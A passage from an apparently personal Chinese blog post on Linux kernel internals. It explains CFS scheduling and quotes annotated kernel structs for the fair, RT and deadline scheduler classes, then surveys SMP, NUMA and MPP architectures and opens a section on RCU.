<p>CFS：完全公平调度器。实际当中，必然会有进程优先级高或进程优先级低，此时CFS调度器会引入权重，使用该权重代表进程的优先级。各个进程会按照权重的比例来分配CPU时间。</p>
<blockquote>
<p>实际运行时间 &#x3D; 调度周期 * 进程权重 &#x2F; 所有进程权重之和 </p>
<p>虚拟运行时间 &#x3D; 实际运行时间 * NICE_0_LOAD &#x2F; 进程权重 </p>
<p>假设有X和Y两个进程，X权重为1024，Y权重为2048，那么X所获得CPU时间的比例为（1024 &#x2F; （1024 + 2048））* 100%</p>
</blockquote>
<p>​        在一个调度周期里面，所有进程的虚拟运行时间都是不变的，所以在进程调度时，只需要找到虚拟运行时间最小的进程调度运行即可。Linux采用红黑树保存调度实体，按照虚拟时间从小到大存储在红黑树中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/diaoducelv.png"
                      alt="diaoducelv"
                ></p>
<p>主调度器：通过调用schedule()函数来完成进程的选择和切换。</p>
<p>周期性调度器：根据频率自动调用scheduler_tick函数，根据进程运行时间触发调度</p>
<p>上下文切换：主要做两个事情（切换地址空间、切换寄存器和栈空间）</p>
<hr>
<p>CFS调度器的Linux部分内核源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">fair_sched_class</span> =</span> &#123;</span><br><span class="line">	.next			= &amp;idle_sched_class, <span class="comment">// CPU运行队列中的下一个调度类，优先级更低，为空闲调度类</span></span><br><span class="line">	.enqueue_task		= enqueue_task_fair,</span><br><span class="line">	.dequeue_task		= dequeue_task_fair,</span><br><span class="line">	.yield_task		= yield_task_fair,</span><br><span class="line">	.yield_to_task		= yield_to_task_fair,</span><br><span class="line"></span><br><span class="line">	.check_preempt_curr	= check_preempt_wakeup,</span><br><span class="line"></span><br><span class="line">	.pick_next_task		= __pick_next_task_fair,</span><br><span class="line">	.put_prev_task		= put_prev_task_fair,</span><br><span class="line">	.set_next_task          = set_next_task_fair,</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	.balance		= balance_fair,</span><br><span class="line">	.select_task_rq		= select_task_rq_fair,</span><br><span class="line">	.migrate_task_rq	= migrate_task_rq_fair,</span><br><span class="line"></span><br><span class="line">	.rq_online		= rq_online_fair,</span><br><span class="line">	.rq_offline		= rq_offline_fair,</span><br><span class="line"></span><br><span class="line">	.task_dead		= task_dead_fair,</span><br><span class="line">	.set_cpus_allowed	= set_cpus_allowed_common,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	.task_tick		= task_tick_fair,</span><br><span class="line">	.task_fork		= task_fork_fair,</span><br><span class="line"></span><br><span class="line">	.prio_changed		= prio_changed_fair,</span><br><span class="line">	.switched_from		= switched_from_fair,</span><br><span class="line">	.switched_to		= switched_to_fair,</span><br><span class="line"></span><br><span class="line">	.get_rr_interval	= get_rr_interval_fair,</span><br><span class="line"></span><br><span class="line">	.update_curr		= update_curr_fair,</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAIR_GROUP_SCHED</span></span><br><span class="line">	.task_change_group	= task_change_group_fair,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UCLAMP_TASK</span></span><br><span class="line">	.uclamp_enabled		= <span class="number">1</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="CFS就绪队列cfs-rq"><a href="#CFS就绪队列cfs-rq" class="headerlink" title="CFS就绪队列cfs_rq"></a>CFS就绪队列cfs_rq</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cfs_rq</span> &#123;</span></span><br><span class="line">    <span class="comment">// 在上面的 sched_entity 结构中也存在同样的 load 成员，一个 sched_entity(se) 的 load 成员表示单个 se 的 load，</span></span><br><span class="line">    <span class="comment">// 而 cfs_rq 上的 load 表示当前 cfs_rq 上所有实体的 load 总和。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">load_weight</span> <span class="title">load</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这两个都是对当前 cfs_rq 上实体的统计，区别在于：nr_running 只表示当前 cfs_rq 上存在的子实体，</span></span><br><span class="line">    <span class="comment">// 如果子实体是调度组，也只算一个。而 h_nr_running 的统计会递归地包含子调度组中的所有实体。</span></span><br><span class="line">    <span class="comment">// 因此可以通过比较这两者是否相等来判断当前 cfs_rq 上是否存在调度组。   </span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_running, h_nr_running;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前 cfs_rq 上执行的时间 </span></span><br><span class="line">    u64 exec_clock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个非常重要的成员，每个 cfs_rq 都会维护一个最小虚拟时间 min_vruntime，这个虚拟时间是一个基准值，</span></span><br><span class="line">    <span class="comment">// 每个新添加到当前队列的 se 都会被初始化为当前的 min_vruntime 附近的值，</span></span><br><span class="line">    <span class="comment">// 以保证新添加的执行实体和当前队列上已存在的实体拥有差不多的执行机会，至于执行多长时间，</span></span><br><span class="line">    <span class="comment">// 则是由对应实体的 load 决定，该 load 会决定 se-&gt;vruntime 的增长速度。  </span></span><br><span class="line">    u64 min_vruntime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cfs_rq 维护的红黑树结构，其中包含一个根节点以及最左边实体(vruntime最小的实体，对应一个进程)的指针。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span> <span class="title">tasks_timeline</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &#x27;curr&#x27; points to currently running entity on this cfs_rq.</span></span><br><span class="line"><span class="comment">     * It is set to NULL otherwise (i.e when none are currently running).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 记录当前 cfs_rq 上特殊的几个实体指针：</span></span><br><span class="line">    <span class="comment">// curr：cfs_rq 上当前正在运行的实体，如果运行的进程实体不在当前 cfs_rq 上，设置为 NULL。</span></span><br><span class="line">    <span class="comment">// 需要注意的是,在支持组调度的情况下,一个进程 se 运行,被设置为当前 cfs_rq 的 curr,</span></span><br><span class="line">    <span class="comment">// 同时其 parent 也会被设置为同级 cfs_rq 的 curr. </span></span><br><span class="line">    <span class="comment">// next：用户特别指定的需要在下一次调度中执行的进程实体，但是这并不是绝对的，</span></span><br><span class="line">    <span class="comment">// 只有在 next 指定的进程实体快要运行(但可能不是下次)的时候，因为这时候不会造成太大的不公平，</span></span><br><span class="line">    <span class="comment">// 就会运行指定的 next，也是一种临时提高优先级的做法。 </span></span><br><span class="line">    <span class="comment">// last：上次执行过的实体不应该跨越公平性原则执行，比如将 next 设置为 last，这时候就需要仔细斟酌一下了，</span></span><br><span class="line">    <span class="comment">// 也是保证公平性的一种方法。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> *<span class="title">curr</span>, *<span class="title">next</span>, *<span class="title">last</span>, *<span class="title">skip</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在多核 CPU 中，对当前 cfs_rq 的负载统计，该统计会精确到每个 se，自然也就会传递到 cfs_rq，</span></span><br><span class="line">    <span class="comment">// 下面的几个成员用于负载统计，目前专注于 cfs 调度的主要实现，负载均衡部分后续再进行分析。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_avg</span> <span class="title">avg</span>;</span></span><br><span class="line">    u64 runnable_load_sum;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> runnable_load_avg;</span><br><span class="line">    <span class="type">atomic_long_t</span> removed_load_avg, removed_util_avg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAIR_GROUP_SCHED</span></span><br><span class="line">    <span class="comment">// 指向 percpu rq 的指针，在不支持组调度的系统中，runqueue 上只存在一个 cfs_rq，</span></span><br><span class="line">    <span class="comment">// 可以直接结构体的地址偏移反向获取到 rq 的指针，而支持组调度的 cfs_rq 可能是 root cfs_rq 的子级 cfs_rq,</span></span><br><span class="line">    <span class="comment">// 因此需要通过一个指针获取当前 cfs_rq 所在的 rq。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span>  </span><br><span class="line"></span><br><span class="line">	<span class="comment">// 一部分是组调度中的带宽控制，在某些应用场景，比如虚拟化或者用户付费使用服务器中，需要对用户的使用带宽或者时长进行限制，</span></span><br><span class="line">    <span class="comment">// 就需要用到 cfs 调度的贷款控制，其实现原理就是在一个周期内，通过某些算法设置用户组应该运行多长时间、</span></span><br><span class="line">    <span class="comment">// 同时计算已经运行了多长时间，如果超时，就将该用户组 throttle，夺取其执行权直到下一个周期。</span></span><br><span class="line">    <span class="comment">// 同样的，cfs 的带宽控制部分我们暂时不深入讨论。 </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CFS_BANDWIDTH</span></span><br><span class="line">    <span class="type">int</span> runtime_enabled;</span><br><span class="line">    <span class="type">int</span> expires_seq;</span><br><span class="line">    u64 runtime_expires;</span><br><span class="line">    s64 runtime_remaining;</span><br><span class="line"></span><br><span class="line">    u64 throttled_clock, throttled_clock_task;</span><br><span class="line">    u64 throttled_clock_task_time;</span><br><span class="line">    <span class="type">int</span> throttled, throttle_count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">throttled_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_CFS_BANDWIDTH */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FAIR_GROUP_SCHED */</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>cfs_rq ： 跟踪就绪队列信息以及管理就绪态调度实体，并且维护一棵按照虚拟时间排序的红黑树</p>
<p>tasks_timeline-&gt;rb_root（红黑树的根）</p>
<p>tasks_timeline-&gt;rb_leftmost（指向虚拟时间最小的结点）</p>
<h2 id="RT调度类rt-sched-class"><a href="#RT调度类rt-sched-class" class="headerlink" title="RT调度类rt_sched_class"></a>RT调度类rt_sched_class</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">rt_sched_class</span> =</span> &#123;</span><br><span class="line">    .next            = &amp;fair_sched_class,</span><br><span class="line">    .enqueue_task        = enqueue_task_rt, <span class="comment">// 将一个task放入到就绪队列头或者尾部</span></span><br><span class="line">    .dequeue_task        = dequeue_task_rt, <span class="comment">// 将一个task从就绪队列末尾</span></span><br><span class="line">    .yield_task        = yield_task_rt, <span class="comment">// 主动放弃执行</span></span><br><span class="line"></span><br><span class="line">    .check_preempt_curr    = check_preempt_curr_rt,</span><br><span class="line">	<span class="comment">// 核心调度器选择就绪队列的哪个任务将要被调度，prev是将要被调度出的任务，返回值是将要被调度的任务。</span></span><br><span class="line">    .pick_next_task        = pick_next_task_rt,</span><br><span class="line">    .put_prev_task        = put_prev_task_rt, <span class="comment">// 当一个任务将要被调度出时执行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    .select_task_rq        = select_task_rq_rt, <span class="comment">// 核心调度器给任务选定CPU，用于将任务分发到不同CPU上执行。</span></span><br><span class="line"></span><br><span class="line">    .set_cpus_allowed       = set_cpus_allowed_rt,</span><br><span class="line">    .rq_online              = rq_online_rt,</span><br><span class="line">    .rq_offline             = rq_offline_rt,</span><br><span class="line">    .post_schedule        = post_schedule_rt,</span><br><span class="line">    .task_woken        = task_woken_rt,</span><br><span class="line">    .switched_from        = switched_from_rt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    .set_curr_task          = set_curr_task_rt, <span class="comment">// 当任务修改其调度类或修改其它任务组时，将调用这个函数。</span></span><br><span class="line">    .task_tick        = task_tick_rt, <span class="comment">// 当时钟中断出发时被调用，主要更新进程运行统计信息以及是否需要调度。</span></span><br><span class="line"></span><br><span class="line">    .get_rr_interval    = get_rr_interval_rt,</span><br><span class="line"></span><br><span class="line">    .prio_changed        = prio_changed_rt,</span><br><span class="line">    .switched_to        = switched_to_rt,</span><br><span class="line"></span><br><span class="line">    .update_curr        = update_curr_rt,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RT就绪队列struct-rt-rq"><a href="#RT就绪队列struct-rt-rq" class="headerlink" title="RT就绪队列struct rt_rq"></a>RT就绪队列struct rt_rq</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rt_rq</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_prio_array</span> <span class="title">active</span>;</span> <span class="comment">// 优先级队列</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> rt_nr_running;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_SMP || defined CONFIG_RT_GROUP_SCHED</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> curr; <span class="comment">/* highest queued rt task prio 最高实时任务的优先级 */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">        <span class="type">int</span> next; <span class="comment">/* next highest 下一个实时任务最高优先级 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125; highest_prio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rt_nr_migratory;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rt_nr_total;</span><br><span class="line">    <span class="type">int</span> overloaded;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">plist_head</span> <span class="title">pushable_tasks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> rt_queued;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rt_throttled <span class="comment">// 当前队列的实时调度是否受限</span></span><br><span class="line">    u64 rt_time; <span class="comment">// 当前队列的累积运行时间</span></span><br><span class="line">    u64 rt_runtime; <span class="comment">// 当前队列的单个period周期内最大运行时间</span></span><br><span class="line">    <span class="comment">/* Nests inside the rq lock: */</span></span><br><span class="line">    <span class="type">raw_spinlock_t</span> rt_runtime_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RT_GROUP_SCHED</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rt_nr_boosted;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_group</span> *<span class="title">tg</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="DL调度类dl-sched-class"><a href="#DL调度类dl-sched-class" class="headerlink" title="DL调度类dl_sched_class"></a>DL调度类dl_sched_class</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/dl_sched_class.png"
                      alt="dl_sched_class"
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">dl_sched_class</span> =</span> &#123;</span><br><span class="line">	.next			= &amp;rt_sched_class,</span><br><span class="line">	.enqueue_task		= enqueue_task_dl,</span><br><span class="line">	.dequeue_task		= dequeue_task_dl,</span><br><span class="line">	.yield_task		= yield_task_dl,</span><br><span class="line"></span><br><span class="line">	.check_preempt_curr	= check_preempt_curr_dl,</span><br><span class="line"></span><br><span class="line">	.pick_next_task		= pick_next_task_dl,</span><br><span class="line">	.put_prev_task		= put_prev_task_dl,</span><br><span class="line">	.set_next_task		= set_next_task_dl,</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	.balance		= balance_dl,</span><br><span class="line">	.select_task_rq		= select_task_rq_dl,</span><br><span class="line">	.migrate_task_rq	= migrate_task_rq_dl,</span><br><span class="line">	.set_cpus_allowed       = set_cpus_allowed_dl,</span><br><span class="line">	.rq_online              = rq_online_dl,</span><br><span class="line">	.rq_offline             = rq_offline_dl,</span><br><span class="line">	.task_woken		= task_woken_dl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	.task_tick		= task_tick_dl,</span><br><span class="line">	.task_fork              = task_fork_dl,</span><br><span class="line"></span><br><span class="line">	.prio_changed           = prio_changed_dl,</span><br><span class="line">	.switched_from		= switched_from_dl,</span><br><span class="line">	.switched_to		= switched_to_dl,</span><br><span class="line"></span><br><span class="line">	.update_curr		= update_curr_dl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="DL就绪队列dl-rq"><a href="#DL就绪队列dl-rq" class="headerlink" title="DL就绪队列dl_rq"></a>DL就绪队列dl_rq</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dl_rq</span> &#123;</span></span><br><span class="line">	<span class="comment">/* runqueue is an rbtree, ordered by deadline */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span>	<span class="title">root</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		dl_nr_running;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Deadline values of the currently executing and the</span></span><br><span class="line"><span class="comment">	 * earliest ready task on this rq. Caching these facilitates</span></span><br><span class="line"><span class="comment">	 * the decision whether or not a ready but not running task</span></span><br><span class="line"><span class="comment">	 * should migrate somewhere else.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		u64		curr;</span><br><span class="line">		u64		next;</span><br><span class="line">	&#125; earliest_dl;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		dl_nr_migratory;</span><br><span class="line">	<span class="type">int</span>			overloaded;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Tasks on this rq that can be pushed away. They are kept in</span></span><br><span class="line"><span class="comment">	 * an rb-tree, ordered by tasks&#x27; deadlines, with caching</span></span><br><span class="line"><span class="comment">	 * of the leftmost (earliest deadline) element.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span>	<span class="title">pushable_dl_tasks_root</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dl_bw</span>		<span class="title">dl_bw</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * &quot;Active utilization&quot; for this runqueue: increased when a</span></span><br><span class="line"><span class="comment">	 * task wakes up (becomes TASK_RUNNING) and decreased when a</span></span><br><span class="line"><span class="comment">	 * task blocks</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u64			running_bw;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Utilization of the tasks &quot;assigned&quot; to this runqueue (including</span></span><br><span class="line"><span class="comment">	 * the tasks that are in runqueue and the tasks that executed on this</span></span><br><span class="line"><span class="comment">	 * CPU and blocked). Increased when a task moves to this runqueue, and</span></span><br><span class="line"><span class="comment">	 * decreased when the task moves away (migrates, changes scheduling</span></span><br><span class="line"><span class="comment">	 * policy, or terminates).</span></span><br><span class="line"><span class="comment">	 * This is needed to compute the &quot;inactive utilization&quot; for the</span></span><br><span class="line"><span class="comment">	 * runqueue (inactive utilization = this_bw - running_bw).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u64			this_bw;</span><br><span class="line">	u64			extra_bw;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Inverse of the fraction of CPU utilization that can be reclaimed</span></span><br><span class="line"><span class="comment">	 * by the GRUB algorithm.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u64			bw_ratio;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h1 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h1><p>从系统架构来看，目前的商用服务器大体可以分为三类，即对称多处理器结构 (SMP ： Symmetric Multi-Processor) 又名 UMA。 非一致存储访问结构 (NUMA ： Non-Uniform Memory Access) ，以及海量并行处理结构 (MPP ： Massive Parallel Processing) 。</p>
<h2 id="SMA系统架构"><a href="#SMA系统架构" class="headerlink" title="SMA系统架构"></a>SMA系统架构</h2><p>SMP (Symmetric Multi  Processing),对称多处理系统内有许多紧耦合多处理器，在这样的系统中，所有的CPU共享全部资源，如总线，内存和I&#x2F;O系统等，操作系统或管理数据库的复本只有一个，这种系统有一个最大的特点就是共享所有资源。多个CPU之间没有区别，平等地访问内存、外设、一个操作系统。操作系统管理着一个队列，每个处理器依次处理队列中的进程。如果两个处理器同时请求访问一个资源（例如同一段内存地址），由硬件、软件的锁机制去解决资源争用问题。Access to RAM is serialized; this and cache coherency issues causes performance to lag slightly behind the number of additional processors in the system.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/uma.png"
                      alt="uma"
                ></p>
<p>所谓对称多处理器结构，是指服务器中多个 CPU 对称工作，无主次或从属关系。各 CPU  共享相同的物理内存，每个 CPU 访问内存中的任何地址所需时间是相同的，因此 SMP 也被称为一致存储器访问结构 (UMA ： Uniform  Memory Access) 。对 SMP 服务器进行扩展的方式包括增加内存、使用更快的 CPU 、增加 CPU 、扩充 I&#x2F;O(  槽口数与总线数 ) 以及添加更多的外部设备 ( 通常是磁盘存储 ) 。</p>
<p>SMP  服务器的主要特征是共享，系统中所有资源 (CPU 、内存、 I&#x2F;O 等 ) 都是共享的。也正是由于这种特征，导致了 SMP  服务器的主要问题，那就是它的扩展能力非常有限。对于 SMP 服务器而言，每一个共享的环节都可能造成 SMP  服务器扩展时的瓶颈，而最受限制的则是内存。由于每个 CPU 必须通过相同的内存总线访问相同的内存资源，因此随着 CPU  数量的增加，内存访问冲突将迅速增加，最终会造成 CPU 资源的浪费，使 CPU 性能的有效性大大降低。实验证明， SMP 服务器 CPU  利用率最好的情况是 2 至 4 个 CPU 。</p>
<h2 id="NUMA系统架构"><a href="#NUMA系统架构" class="headerlink" title="NUMA系统架构"></a>NUMA系统架构</h2><p>由于 SMP 在扩展能力上的限制，人们开始探究如何进行有效地扩展从而构建大型系统的技术， NUMA(Non-Uniform Memory Access) 就是这种努力下的结果之一。利用 NUMA 技术，可以把几十个 CPU( 甚至上百个 CPU) 组合在一个服务器内。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/numa.png"
                      alt="numa"
                ></p>
<p>NUMA 服务器的基本特征是具有多个 CPU 模块，每个 CPU 模块由多个 CPU( 如 4 个 ) 组成，并且具有独立的本地内存、 I&#x2F;O 槽口等。由于其节点之间可以通过互联模块 ( 如称为 Crossbar Switch)  进行连接和信息交互，因此每个 CPU 可以访问整个系统的内存 ( 这是 NUMA 系统与 MPP 系统的重要差别 )  。显然，访问本地内存的速度将远远高于访问远地内存 ( 系统内其它节点的内存 ) 的速度，这也是非一致存储访问 NUMA  的由来。由于这个特点，为了更好地发挥系统性能，开发应用程序时需要尽量减少不同 CPU 模块之间的信息交互。</p>
<p>利用 NUMA 技术，可以较好地解决原来 SMP 系统的扩展问题，在一个物理服务器内可以支持上百个 CPU 。比较典型的 NUMA 服务器的例子包括 HP 的 Superdome 、 SUN15K 、 IBMp690 等。</p>
<p>但 NUMA 技术同样有一定缺陷，由于访问远地内存的延时远远超过本地内存，因此当 CPU 数量增加时，系统性能无法线性增加。如 HP 公司发布  Superdome 服务器时，曾公布了它与 HP 其它 UNIX 服务器的相对性能值，结果发现， 64 路 CPU 的 Superdome  (NUMA 结构 ) 的相对性能值是 20 ，而 8 路 N4000( 共享的 SMP 结构 ) 的相对性能值是 6.3 。从这个结果可以看到， 8 倍数量的 CPU 换来的只是 3 倍性能的提升。</p>
<h2 id="MPP系统架构"><a href="#MPP系统架构" class="headerlink" title="MPP系统架构"></a>MPP系统架构</h2><p>和 NUMA 不同， MPP 提供了另外一种进行系统扩展的方式，它由多个 SMP  服务器通过一定的节点互联网络进行连接，协同工作，完成相同的任务，从用户的角度来看是一个服务器系统。其基本特征是由多个 SMP 服务器 ( 每个  SMP 服务器称节点 ) 通过节点互联网络连接而成，每个节点只访问自己的本地资源 ( 内存、存储等 ) ，是一种完全无共享 (Share  Nothing) 结构，因而扩展能力最好，理论上其扩展无限制，目前的技术可实现 512 个节点互联，数千个 CPU  。目前业界对节点互联网络暂无标准，如 NCR 的 Bynet ， IBM 的 SPSwitch  ，它们都采用了不同的内部实现机制。但节点互联网仅供 MPP 服务器内部使用，对用户而言是透明的。</p>
<p>在 MPP 系统中，每个 SMP 节点也可以运行自己的操作系统、数据库等。但和 NUMA  不同的是，它不存在异地内存访问的问题。换言之，每个节点内的 CPU  不能访问另一个节点的内存。节点之间的信息交互是通过节点互联网络实现的，这个过程一般称为数据重分配 (Data Redistribution) 。</p>
<p>但是 MPP 服务器需要一种复杂的机制来调度和平衡各个节点的负载和并行处理过程。目前一些基于 MPP 技术的服务器往往通过系统级软件 ( 如数据库 ) 来屏蔽这种复杂性。举例来说， NCR 的 Teradata 就是基于 MPP  技术的一个关系数据库软件，基于此数据库来开发应用时，不管后台服务器由多少个节点组成，开发人员所面对的都是同一个数据库系统，而不需要考虑如何调度其中某几个节点的负载。</p>
<p>MPP (Massively Parallel  Processing)，大规模并行处理系统，这样的系统是由许多松耦合的处理单元组成的，要注意的是这里指的是处理单元而不是处理器。每个单元内的CPU都有自己私有的资源，如总线，内存，硬盘等。在每个单元内都有操作系统和管理数据库的实例复本。这种结构最大的特点在于不共享资源。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/mpp.png"
                      alt="mpp"
                ></p>
<h1 id="RCU-机制"><a href="#RCU-机制" class="headerlink" title="RCU 机制"></a>RCU 机制</h1><p>Read-copy update (RCU) 是一种 2002 年 10 月被引入到内核当中的同步机制。通过允许在更新的同时读数据，RCU 提高了同步机制的可伸缩性（scalability）。相对于传统的在并发线程间不区分是读者还是写者的简单互斥性锁机制，或者是哪些允许并发读但同时不 允许写的读写锁，RCU 支持同时一个更新线程和多个读线程的并发。RCU  通过保存对象的多个副本来保障读操作的连续性，并保证在预定的读方临界区没有完成之前不会释放这个对象。RCU定义并使用高效、可伸缩的机制来发布并读取 对象的新版本，并延长旧版本们的寿命。这些机制将工作分发到了读和更新路径上，以保证读路径可以极快地运行。在某些场合（非抢占内核），RCU  的读方没有任何性能负担。</p>
<blockquote>
<p>Linux内核源码当中,关于RCU的文档比较齐全，你可以在 <code>Documentation/RCU/</code>  目录下找到这些文件。Paul E. McKenney  是内核中RCU源码的主要实现者，他也写了很多RCU方面的文章。他把这些文章和一些关于RCU的论文的链接整理到了一起：<a class="link"   href="http://www2.rdrop.com/users/paulmck/RCU/" >http://www2.rdrop.com/users/paulmck/RCU/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="RCU机制解决了什么"><a href="#RCU机制解决了什么" class="headerlink" title="RCU机制解决了什么"></a>RCU机制解决了什么</h2><p>在RCU的实现过程中，我们主要解决以下问题：</p>
